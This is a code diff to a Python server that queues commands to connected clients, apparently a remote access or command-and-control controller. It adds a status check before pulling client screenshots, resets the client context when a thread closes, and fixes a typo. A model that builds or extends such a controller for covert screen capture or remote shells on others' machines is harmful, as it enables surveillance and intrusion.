@@ -49,7 +49,6 @@ def handle_client(conn, addr, command_queue):
                 command = client.command_controller(command.lower())
 
                 # Send the command to the client
-
                 if command != "shell":
                     if command != "help" and \
                             command != "unknown" and \
@@ -69,7 +68,13 @@ def handle_client(conn, addr, command_queue):
                             # random str (8char) to avoid conflict
                             random_str = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8))
                             screenshot_path = f"screenshot_{random_str}.png"
-                            lib.download_file(screenshot_path, conn)
+                            screenshot_status = conn.recv(1024).decode('utf-8')
+                            if screenshot_status == "NOK":
+                                pass
+                                # print("[-] No display detected on client")
+                                # lib.print_mko_client(current_thread.ident)
+                            elif screenshot_status == "ok":
+                                lib.download_file(screenshot_path, conn)
 
                         # If the command is "close", close the connection
                         if command == "close":
@@ -92,7 +97,11 @@ def handle_client(conn, addr, command_queue):
     if context_manager is None:
         lib.print_mko_prefix()
     else:
-        lib.print_mko_client(context_manager)
+        if context_manager == current_thread.ident:
+            context_manager = None
+            lib.print_mko_prefix()
+        else:
+            lib.print_mko_client(context_manager)
 
     conn.close()
     clients.pop(clients.index((conn, addr)))
@@ -162,8 +171,9 @@ def command_line_interface():
                     thread_index = thread_id_from_command
 
                 if thread_id is not None:
+
                     context_manager = thread_id
-                    command_queue_manager = lib.use_manger(thread_id, thread_to_conn, client_queues)
+                    command_queue_manager = lib.use_manager(thread_id, thread_to_conn, client_queues)
 
                     if command_queue_manager == "close":
                         threads.pop(thread_index)
